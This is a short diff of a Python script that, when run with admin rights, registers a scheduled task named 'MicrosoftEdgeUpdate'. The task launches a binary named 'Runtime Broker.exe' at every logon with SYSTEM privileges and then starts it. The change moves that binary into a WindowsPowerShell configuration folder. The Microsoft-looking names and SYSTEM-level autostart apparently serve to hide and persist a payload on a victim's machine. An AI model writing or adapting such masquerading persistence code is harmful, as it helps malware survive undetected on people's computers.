@@ -8,7 +8,7 @@ def is_admin():
         return False
 
 if is_admin():
-    path = "\"C:\Program Files\Microsoft Update Health Tools\Runtime Broker.exe\""
+    path = "\"C:\Program Files\WindowsPowerShell\Configuration\Runtime Broker.exe\""
     command = "schtasks /create /sc ONLOGON /tn MicrosoftEdgeUpdate /tr " + path + " /ru \"SYSTEM\""
     p = os.popen(command)
     command = "schtasks /run /tn \"MicrosoftEdgeUpdate\""
